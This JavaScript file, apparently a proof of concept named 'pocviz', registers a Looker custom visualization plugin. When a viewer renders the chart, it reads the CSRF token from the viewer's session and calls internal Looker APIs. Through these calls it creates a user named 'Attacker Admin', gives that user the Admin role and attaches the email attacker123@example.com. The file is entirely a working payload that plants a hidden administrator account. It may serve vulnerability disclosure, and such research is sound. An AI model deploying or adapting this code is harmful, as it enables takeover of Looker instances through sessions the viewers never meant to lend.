window.looker.plugins.visualizations.add({
    id: "pocviz",
    create: function(el){ el.innerHTML = ""; },
    updateAsync: function(data, el, cfg, qr, det, done){
    var t = window.top, mail = "attacker123@example.com";              // same-origin => the viewer's Looker app
    var c = decodeURIComponent(t.document.cookie.split(";").find(function(e){return e.trim().startsWith("CSRF-TOKEN=");}).split("=")[1]);
    var h = { "X-Csrf-Token": c, "Content-Type": "application/json" };
    t.fetch("/api/internal/core/4.0/roles?fields=id,name", {credentials:"include", headers:h}).then(function(r){return r.json();}).then(function(rs){
        var admin = rs.find(function(x){ return x.name === "Admin"; }).id;
        t.fetch("/api/internal/core/4.0/users", {method:"POST", credentials:"include", headers:h, body:JSON.stringify({first_name:"Attacker", last_name:"Admin"})}).then(function(r){return r.json();}).then(function(u){
        t.fetch("/api/internal/core/4.0/users/"+u.id+"/roles", {method:"PUT", credentials:"include", headers:h, body:JSON.stringify([admin])});
        t.fetch("/api/internal/core/4.0/users/"+u.id+"/credentials_email", {method:"POST", credentials:"include", headers:h, body:JSON.stringify({email:mail})});
        });
    });
    done();
    }
});